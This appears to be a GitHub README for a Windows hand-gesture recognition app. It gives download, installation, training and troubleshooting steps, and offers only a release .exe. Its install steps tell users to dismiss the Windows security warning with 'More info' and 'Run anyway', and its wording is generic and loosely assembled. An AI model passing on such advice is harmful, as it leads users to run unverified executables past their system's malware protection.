# 🖐️ lstm-gesture-learner - Teach your computer custom hand signs

[![Download for Windows](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/aduseisamuel212-pixel/lstm-gesture-learner)

This application tracks hand movements to trigger actions on your computer. You teach the software specific gestures, and the program learns to identify them. It uses deep learning models to watch your hand via your webcam. The system converts these recognized signs into text or spoken output. You can use this tool to control software or assist with communication.

## 💻 System Requirements

To run this application, your computer needs the following specifications:

*   Operating System: Windows 10 or Windows 11.
*   Processor: Intel Core i5 or equivalent processor with at least 2.0 GHz speed.
*   Memory: 8 GB of RAM or more.
*   Graphics: Integrated or dedicated webcam with a resolution of at least 720p.
*   Storage: 500 MB of available space for the installation.
*   Dependencies: The application requires the latest version of the Windows Media Feature Pack.

## 📥 How to Download 

Follow these steps to obtain the software:

1. Visit the [official release page](https://github.com/aduseisamuel212-pixel/lstm-gesture-learner).
2. Look for the latest version under the Releases section on the right side of the page.
3. Click the file ending in .exe to start the download.
4. Save the file to your desktop or downloads folder.

## ⚙️ Installation Process

Once you finish the download, follow these instructions to set up the software:

1. Double-click the downloaded .exe file.
2. A security prompt from Windows may appear. Click "More info" and then "Run anyway" if the system asks for confirmation.
3. Follow the on-screen prompts in the installer window.
4. Choose the default folder for installation and click "Next."
5. Click "Install" to begin the process.
6. Once the progress bar fills, click "Finish" to exit the installer.
7. A shortcut icon will appear on your desktop.

## 🎓 Getting Started with Gestures

Before the software recognizes your hand, you must store your unique gestures in the database.

1. Launch the application from your desktop shortcut icon.
2. Grant permission for the app to access your webcam when prompted.
3. Ensure your hand remains visible within the camera frame.
4. Go to the "Training" tab in the navigation menu.
5. Enter a name for the gesture, such as "Hello" or "Stop," in the text box.
6. Click the "Record" button.
7. Perform the gesture clearly in front of the camera for five seconds.
8. Click "Stop Recording."
9. Repeat this process for each gesture you wish to teach the system.
10. Click the "Save Model" button to store your learned data.

## 🧠 Using the Recognition System

After training, switch to the "Recognition" mode to use your gestures:

1. Navigate to the main screen of the application.
2. Click the "Start Recognition" button.
3. Perform the gestures you previously saved.
4. The application identifies your hand movements in real-time.
5. The result appears in the text area on your screen.
6. The text-to-speech feature reads the recognized gesture aloud if enabled in the settings menu.

## 🛠️ Troubleshooting Common Issues

If the software does not work as expected, check these common fixes:

*   Camera not found: Ensure no other applications like Zoom or Skype are currently using your webcam. Close those programs and restart the application.
*   Poor recognition: Lighting conditions affect the camera. Ensure you have adequate light on your hands. Avoid backlighting from windows.
*   Slow response: Ensure your laptop is plugged into a power source. Battery-saver modes often reduce processing power, which slows down the gesture recognition engine.
*   Missing text output: Check your system volume settings to verify the text-to-speech voice is not muted.
*   App crash during training: Delete the current model files inside the installation folder and restart the application to create a fresh learning profile.

## 📂 Understanding the Data Folders

The application stores your data in the installation directory. You will find several folders that manage the behavior of the software:

*   /models: This folder keeps the files generated when you train your gestures. You can back up this folder to save your progress if you move to a new computer.
*   /logs: This area records small text files that help diagnose performance errors. You can send these to technical support if you encounter recurring problems.
*   /config: This file stores your user preferences, such as camera resolution and voice settings.

## 🔐 Privacy and Security

The application processes all video data on your local machine. It does not send video feeds, images, or gesture data to any cloud service or server. Your learned gestures stay purely on your computer hardware. You maintain full control over the data. To remove all traces of the application, simply run the "Uninstall" tool found in your Windows Control Panel, which removes the software and all locally saved gesture models.

## 🚀 Improving Recognition Accuracy

You can increase the success rate of the model through these methods:

*   Consistency: Perform your gestures with the same speed and distance from the camera every time.
*   Dataset size: Train each gesture multiple times from slightly different angles. This helps the underlying neural network understand the gesture through various perspectives.
*   Background clutter: Keep the background behind you simple. A plain wall provides higher contrast for the visual system to distinguish your hand from your clothes or furniture.